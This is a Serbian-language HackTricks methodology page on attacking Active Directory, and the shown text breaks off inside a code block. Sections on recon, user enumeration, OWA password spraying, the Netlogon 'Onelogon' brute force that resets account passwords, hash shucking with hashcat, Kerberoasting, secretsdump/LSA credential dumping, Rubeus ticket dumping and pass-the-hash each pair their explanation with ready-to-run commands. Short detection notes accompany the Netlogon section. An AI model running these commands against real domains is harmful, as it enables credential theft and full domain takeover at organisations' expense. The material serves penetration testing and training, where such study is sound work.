# Metodologija Active Directory-ja

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava **mrežnim administratorima** da efikasno kreiraju i upravljaju **domenima**, **korisnicima** i **objektima** unutar mreže. Projektovan je tako da bude skalabilan, olakšavajući organizaciju velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura sistema **Active Directory** sastoji se od tri osnovna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** predstavljaju grupe ovih domena povezane zajedničkom strukturom, dok **šuma** predstavlja kolekciju više stabala međusobno povezanih putem **odnosa poverenja**, čineći najviši sloj organizacione strukture. Na svakom od ovih nivoa mogu se definisati posebna **prava pristupa** i **komunikaciona prava**.

Ključni koncepti unutar sistema **Active Directory** uključuju:

1. **Direktorijum** – Sadrži sve informacije koje se odnose na objekte sistema Active Directory.
2. **Objekat** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene fascikle**.
3. **Domen** – Predstavlja kontejner za objekte direktorijuma, pri čemu više domena može koegzistirati unutar jednog **šuma**, a svaki domen održava sopstvenu kolekciju objekata.
4. **Stablo** – Grupa domena koji dele zajednički korenski domen.
5. **Šuma** – Najviši nivo organizacione strukture u sistemu Active Directory, sastavljen od više stabala sa međusobnim **odnosima poverenja**.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa od ključnog značaja za centralizovano upravljanje mrežom i komunikaciju unutar nje. Ovi servisi obuhvataju:

1. **Domain Services** – Centralizuje čuvanje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući funkcije **autentifikacije** i **pretrage**.
2. **Certificate Services** – Upravlja kreiranjem, distribucijom i upravljanjem bezbednim **digitalnim sertifikatima**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijum putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućava funkciju **single sign-on** za autentifikaciju korisnika u više web aplikacija tokom jedne sesije.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Od ključnog je značaja za razrešavanje **naziva domena**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Definicija Active Directory-ja**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro **razumete** **proces Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još uvek ne znate kako funkcioniše.**](kerberos-authentication.md)

## Cheat Sheet

Možete posetiti [https://wadcoms.github.io/](https://wadcoms.github.io) da biste brzo pregledali koje komande možete pokrenuti za enumeraciju/eksploataciju sistema AD.

> [!WARNING]
> Kerberos komunikacija obično **zahteva potpuno kvalifikovano ime domena (FQDN)** kako bi klijent mogao da dobije tiket za odgovarajući SPN. Pristup mašini putem IP adrese najčešće dovodi do korišćenja NTLM-a umesto Kerberos-a.

## Recon Active Directory-ja (bez kredencijala/sesija)

Ako imate pristup AD okruženju, ali nemate nikakve kredencijale/sesije, možete:

- **Pentest mreže:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **iskoristite ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md)).
- Enumeracija DNS-a može pružiti informacije o ključnim serverima u domenu, kao što su web serveri, štampači, share-ovi, VPN, mediji itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting metodologiju**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako ovo uraditi.
- **Proverite null i Guest pristup SMB servisima** (ovo neće funkcionisati na modernim verzijama sistema Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič o enumeraciji SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerišite LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič o enumeraciji LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonimni pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Prikupite kredencijale [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupite kredencijale **izlaganjem** [**lažnih UPnP servisa sa evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izvucite korisnička imena/imena iz internih dokumenata, društvenih mreža i servisa (uglavnom web servisa) unutar domenskih okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete pokušati različite AD **konvencije za korisnička imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog imena), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _nasumična slova i 3 nasumična broja_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledajte stranice o [**pentesting SMB-a**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP-a**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti koristeći **Kerberos grešku** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili odgovor sa **TGT-om u AS-REP-u** ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, koja ukazuje da korisnik mora da izvrši pre-authentication.
- **No Authentication against MS-NRPC**: Korišćenje auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na kontrolerima domena. Ova metoda poziva funkciju `DsrGetDcNameEx2` nakon povezivanja sa MS-NRPC interfejsom kako bi proverila da li korisnik ili računar postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovaj tip enumeracije. Istraživanje je dostupno [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera na mreži, možete izvršiti i **enumeraciju korisnika nad njim**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom github repozitorijumu**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji**, do kojih je trebalo da dođete tokom recon koraka koji ste obavili pre ovoga. Na osnovu imena i prezimena mogli biste da koristite skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje potencijalno validnih korisničkih imena.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Čak i nakon što je **Zerologon** zakrpljen na DC-u, eksplicitno dozvoljeni nalozi i dalje mogu biti izloženi **legacy/vulnerable Netlogon secure-channel ponašanju**. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća registry vrednost **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL security descriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Svaki nalog ili grupa kojima je dodeljen odgovarajući ACE u DACL-u mogu biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno dodaje **Everyone** na allow-listu.

Praktičan workflow operatora:

1. **Identifikujte allow-listed principals** proverom i **SYSVOL/GPO** i **live DC registry-ja**.
2. **Razrešite SID-ove** pronađene u SDDL-u u stvarne AD korisnike/računare i dajte prioritet **DC machine account-ima**, **trust account-ima** i drugim privilegovanim računarima.
3. Više puta pokušajte **MS-NRPC / Netlogon authentication** kao allow-listed nalog.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon password-setting** da biste resetovali lozinku ciljnog naloga (javni PoC je postavlja na prazan string).<sup>[[9]](#references)[[10]](#references)</sup>

Brzi primeri za triage / lab iz javnog artefakta:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Napomene:

- **scanner** je koristan zato što efektivna allow-list može da postoji u **SYSVOL** direktorijumu, u **registry**-ju ili na oba mesta.
- Sama exploit putanja je važna zato što **ne zahteva Domain Admin privilegije** nakon identifikovanja ranjivog naloga.
- Kompromitovanje **Domain Controller machine account** naloga kao što je `DC$` posebno je opasno, jer resetovanje te lozinke može direktno omogućiti šire putanje za **AD takeover**.
- Izvodljivost **brute-force** napada zavisi od režima: javno dostupni artifact opisuje meet-in-the-middle pristup, **24-bit** brute force kada je dostupan drugi computer account i sporije **32-bit** varijante.

Napomene o detekciji / hardening-u:

- Proverite allow-list policy i uklonite sve osim privremenih, izričito zahtevanih compatibility exception-a.
- Pratite DC **System** događaje **5827/5828/5829/5830/5831** kako biste otkrili ranjive Netlogon konekcije koje su odbijene, otkrivene ili izričito dozvoljene policy-jem.
- Naloge u `VulnerableChannelAllowList` tretirajte kao **high-risk** dok se legacy dependency ne ukloni.

### Poznavanje jednog ili više username-ova

U redu, dakle znate da već imate validan username, ali nemate lozinke... Zatim pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_, možete **zatražiti AS_REP poruku** za tog korisnika, koja će sadržati podatke šifrovane derivacijom lozinke tog korisnika.
- [**Password Spraying**](password-spraying.md): Pokušajte sa najčešćim **lozinkama** za svakog od otkrivenih korisnika; možda neki korisnik koristi lošu lozinku (imajte na umu password policy!).
- Imajte na umu da možete raditi **spraying OWA servera** kako biste pokušali da dobijete pristup mail serverima korisnika.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **pribavite** neke challenge **hash-eve** tako što ćete izvršiti **poisoning** nekih protokola na **mreži**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeracija pruža potencijalne naloge, hostove i servise koji mogu biti primorani da se autentifikuju. Iskoristite taj kontekst da identifikujete izvodljive NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) i potencijalne putanje ka AD okruženju.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** kako biste održali stanje AD recon-a po engagement-u: `workspace create <name>` kreira SQLite DB-ove po protokolu u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Menjajte prikaze pomoću `proto smb|mssql|winrm`, a prikupljene secrets navedite pomoću `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Brzo otkrivanje subnet-a pomoću **`netexec smb <cidr>`** prikazuje **domain**, **OS build**, **SMB signing requirements** i **Null Auth**. Članovi koji prikazuju `(signing:False)` podložni su **relay** napadima, dok DC-ovi često zahtevaju signing.
- Generišite **hostname-ove u /etc/hosts** direktno iz NetExec output-a kako biste olakšali targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay ka DC-u blokiran** zbog potpisivanja, ipak proverite stanje **LDAP-a**: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding podešavanje. DC kod kog je SMB potpisivanje obavezno, ali je LDAP potpisivanje onemogućeno, i dalje predstavlja moguću metu za **relay-to-LDAP** zloupotrebe kao što je **SPN-less RBCD**.

### Curenja printer credential sa klijentske strane → masovna validacija domen credential-a

- Printer/web interfejsi ponekad **ugrađuju maskirane admin lozinke u HTML**. Pregled izvornog koda/devtools alata može otkriti čist tekst (npr. `<input value="<password>">`), što omogućava Basic-auth pristup repozitorijumima za skeniranje/štampu.
- Preuzeti print job-ovi mogu sadržati **plaintext onboarding dokumente** sa lozinkama za pojedinačne korisnike. Prilikom testiranja održavajte uparivanja usklađenim:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Krađa NTLM akreditiva

Ako možete da **pristupite drugim računarima ili deljenim resursima** pomoću **null ili guest korisnika**, možete **postaviti datoteke** (kao što je SCF datoteka) koje će, ako im se na neki način pristupi, **pokrenuti NTLM autentifikaciju prema vama**, čime možete **ukrasti** **NTLM izazov** i pokušati da ga crackujete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking i NT-Candidate napadi

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidatsku lozinku za druge, sporije formate čiji se ključni materijal direktno izvodi iz NT hash-a. Umesto brute-force pokušaja nad dugim passphrase vrednostima u Kerberos RC4 ticketima, NetNTLM izazovima ili keširanim akreditivima, prosleđujete NT hash-eve Hashcat-ovim NT-candidate režimima i omogućavate mu da proveri ponovno korišćenje lozinke, bez potrebe da ikada sazna plaintext. Ovo je naročito efikasno nakon kompromitovanja domena, kada možete prikupiti hiljade trenutnih i istorijskih NT hash-eva.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate NT skup iz DCSync-a, SAM/SECURITY dump-ova ili credential vault-ova i potrebno je da proverite ponovno korišćenje u drugim domenima/šumama.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore ili DCC/DCC2 blob-ove.
- Želite brzo da dokažete ponovno korišćenje dugih passphrase vrednosti koje nije moguće crackovati i odmah pređete na Pass-the-Hash.

Ova tehnika **ne funkcioniše** protiv tipova enkripcije čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen zahteva isključivo AES, morate se vratiti na uobičajene password režime.

#### Pravljenje NT hash skupa

- **DCSync/NTDS** – Koristite `secretsdump.py` sa istorijom da biste preuzeli najveći mogući skup NT hash-eva (i njihove prethodne vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Unosi istorije značajno proširuju skup kandidata jer Microsoft može da čuva do 24 prethodna hash-a po nalogu. Za više načina za prikupljanje NTDS tajni pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump-ovi** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izdvaja lokalne SAM/SECURITY podatke i keširane prijave domena (DCC/DCC2). Uklonite duplikate i dodajte te hash-eve u istu listu `nt_candidates.txt`.
- **Pratite metapodatke** – Čuvajte korisničko ime/domen iz kog je potekao svaki hash (čak i ako wordlist sadrži samo heksadecimalne vrednosti). Podudarni hash-evi odmah pokazuju koji principal ponovo koristi lozinku čim Hashcat prikaže pronađenog kandidata.
- Prednost dajte kandidatima iz iste šume ili pouzdane šume; time maksimizujete verovatnoću preklapanja tokom shucking-a.

#### Hashcat NT-candidate režimi

| Tip hash-a                              | Password režim | NT-Candidate režim |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- NT-candidate ulazi **moraju ostati sirovi NT hash-evi od 32 heksadecimalna znaka**. Isključite rule engine-e (bez `-r` i bez hybrid režima), jer izmena kandidata oštećuje ključni materijal kandidata.
- Ovi režimi sami po sebi nisu brži, ali je NTLM keyspace (~30.000 MH/s na M3 Max-u) približno 100 puta brži od Kerberos RC4-a (~300 MH/s). Testiranje pažljivo odabrane NT liste mnogo je jeftinije od istraživanja celog password space-a u sporom formatu.
- Uvek pokrenite **najnoviju Hashcat verziju** (`git clone https://github.com/hashcat/hashcat && make install`) jer su režimi 31500/31600/35300/35400 nedavno dodati.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT režim za AS-REQ Pre-Auth, a AES etype-ovi (19600/19700) zahtevaju plaintext lozinku jer se njihovi ključevi izvode pomoću PBKDF2 iz UTF-16LE lozinki, a ne iz sirovih NT hash-eva.

#### Primer – Kerberoast RC4 (režim 35300)

1. Uhvatite RC4 TGS za ciljni SPN pomoću korisnika sa niskim privilegijama (detalje pogledajte na Kerberoast stranici):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Primenite shucking na ticket pomoću svoje NT liste:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Podudaranje potvrđuje da service account koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pređite na PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Po potrebi možete kasnije povratiti plaintext pomoću `hashcat -m 1000 <matched_hash> wordlists/`.

#### Primer – Keširani akreditivi (režim 31600)

1. Preuzmite keširane prijave sa kompromitovane radne stanice:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju korisnika iz interesantnog domena u `dcc2_highpriv.txt` i primenite shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno podudaranje daje NT hash koji je već poznat u vašoj listi, čime se dokazuje da keširani korisnik ponovo koristi istu lozinku. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM režimu da biste povratili string.

Potpuno isti postupak primenjuje se na NetNTLM challenge-response vrednosti (`-m 27000/27100`) i DCC (`-m 31500`). Kada identifikujete podudaranje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo crackovati NT hash pomoću maski/rules offline.



## Enumerisanje Active Directory-ja WITH akreditivima/sesijom

Za ovu fazu morate imati **kompromitovane akreditive ili sesiju važećeg naloga domena.** Ako imate neke važeće akreditive ili shell kao korisnik domena, **treba da zapamtite da su prethodno navedene opcije i dalje moguće opcije za kompromitovanje drugih korisnika**.

Pre početka autentifikovanog enumerisanja, upoznajte se sa **Kerberos double-hop problemom**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerisanje

Kompromitovanje naloga je **veliki korak ka proceni domena**, jer omogućava autentifikovano **Active Directory enumerisanje**:

Kada je reč o [**ASREPRoast**](asreproast.md), sada možete pronaći svakog potencijalno ranjivog korisnika, a kada je reč o [**Password Spraying**](password-spraying.md), možete dobiti **listu svih korisničkih imena** i pokušati lozinku kompromitovanog naloga, prazne lozinke i nove obećavajuće lozinke.

- Možete koristiti [**CMD za osnovni recon**](../basic-cmd-for-pentesters.md#domain-info)
- Takođe možete koristiti [**powershell za recon**](../basic-powershell-for-pentesters/index.html), što će biti diskretnije
- Možete i [**koristiti powerview**](../basic-powershell-for-pentesters/powerview.md) za izdvajanje detaljnijih informacija
- Još jedan odličan alat za recon u Active Directory-ju je [**BloodHound**](bloodhound.md). On **nije naročito diskretan** (u zavisnosti od metoda prikupljanja koje koristite), ali **ako vam to nije važno**, svakako pokušajte. Pronađite gde korisnici mogu da koriste RDP, pronađite putanju do drugih grupa itd.
- **Drugi automatizovani alati za AD enumerisanje su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS zapisi AD-ja**](ad-dns-records.md), jer mogu sadržati interesantne informacije.
- **AdExplorer.exe** iz paketa **SysInternal** Suite je **alat sa GUI-jem** koji možete koristiti za enumerisanje direktorijuma.
- Takođe možete pretraživati LDAP bazu pomoću **ldapsearch** da biste pronašli akreditive u poljima _userPassword_ i _unixUserPassword_, ili čak u polju _Description_. Za druge metode pogledajte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Ako koristite **Linux**, domen možete enumerisati i pomoću [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete pokušati i sa automatizovanim alatima kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Izdvajanje svih korisnika domena**

Veoma je lako dobiti sva korisnička imena domena iz Windows-a (`net user /domain`, `Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Iako ovaj odeljak o Enumerisanju izgleda kratko, on je najvažniji deo celog postupka. Otvorite linkove (pre svega one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne budete osećali sigurno. Tokom procene, ovo će biti ključni trenutak za pronalaženje puta do DA ili za donošenje odluke da ništa nije moguće.

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS ticket-a** koje koriste servisi povezani sa korisničkim nalozima i njihovo offline crackovanje — enkripcija se zasniva na korisničkim lozinkama.

Više informacija o ovome:


{{#ref}}
kerberoast.md
{{#endref}}

### Udaljena konekcija (RDP, SSH, FTP, Win-RM itd.)

Kada pribavite neke akreditive, možete proveriti da li imate pristup nekoj **mašini**. U tu svrhu možete koristiti **CrackMapExec** za pokušaj povezivanja na više servera preko različitih protokola, u skladu sa rezultatima vašeg skeniranja portova.

### Lokalna eskalacija privilegija

Ako ste kompromitovali akreditive ili sesiju običnog korisnika domena i možete da pristupite **bilo kojoj mašini u domenu**, potražite način da **lokalno eskalirate privilegije i prikupite akreditive**. Lokalne administratorske privilegije mogu vam omogućiti da **izdumpujete hash-eve drugih korisnika** iz memorije (LSASS) i lokalnog skladišta (SAM).

U ovoj knjizi postoji cela stranica o [**lokalnoj eskalaciji privilegija u Windows-u**](../windows-local-privilege-escalation/index.html) i [**checklist-i**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Ticket-i trenutne sesije

Veoma je **malo verovatno** da ćete pronaći **ticket-e** u trenutnom korisniku koji vam **daju dozvolu za pristup** neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Sa domen credentials ili korisničkom sesijom, ponovo isprobajte NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): authenticated enumeration i coercion tehnike mogu otkriti relay putanje koje nisu bile dostupne tokom unauthenticated reconnaissance.

### Traženje Creds u Computer Shares | SMB Shares

Sada kada imate neke osnovne credentials, trebalo bi da proverite da li možete da **pronađete** neke **zanimljive fajlove koji se dele unutar AD-a**. To možete uraditi ručno, ali to je veoma dosadan repetitivan zadatak (posebno ako pronađete stotine dokumenata koje morate da proverite).

[**Pratite ovaj link da biste saznali više o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Krađa NTLM Creds

Ako možete da **pristupite drugim računarima ili share-ovima**, mogli biste da **postavite fajlove** (kao što je SCF fajl) koji će, ako im se na neki način pristupi, **pokrenuti NTLM authentication prema vama**, tako da možete da **ukradete** **NTLM challenge** i crackujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala svakom authenticated korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation na Active Directory-ju SA privileged credentials/session

**Za sledeće tehnike običan domain korisnik nije dovoljan; potrebne su vam posebne privilegije/credentials za izvođenje ovih napada.**

### Izdvajanje hash-eva

Nadamo se da ste uspeli da **kompromitujete neki local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalno povećanje privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dumpujete sve hash-eve iz memorije i sa lokalnog sistema.\
[**Pročitajte ovu stranicu o različitim načinima za dobijanje hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti za **impersonate** tog korisnika.\
Potrebno je da koristite neki **tool** koji će **obaviti** **NTLM authentication koristeći** taj **hash**, **ili** možete kreirati novu **sessionlogon** sesiju i **injectovati** taj **hash** unutar **LSASS-a**, tako da se, kada se obavi bilo koja **NTLM authentication**, koristi taj **hash**. Poslednja opcija je ono što mimikatz radi.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **koristi NTLM hash korisnika za zahtevanje Kerberos tickets**, kao alternativu uobičajenom Pass The Hash napadu preko NTLM protokola. Zbog toga ovo može biti naročito **korisno u mrežama u kojima je NTLM protokol onemogućen** i u kojima je kao authentication protokol dozvoljen samo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Kod metode napada **Pass The Ticket (PTT)**, napadači **kradu authentication ticket korisnika** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni ticket se zatim koristi za **impersonate** korisnika, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponovna upotreba Credentials

Ako imate **hash** ili **password** nekog **local administrato**r naloga, trebalo bi da pokušate da se **lokalno prijavite** na druge **PC-jeve** koristeći ga.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
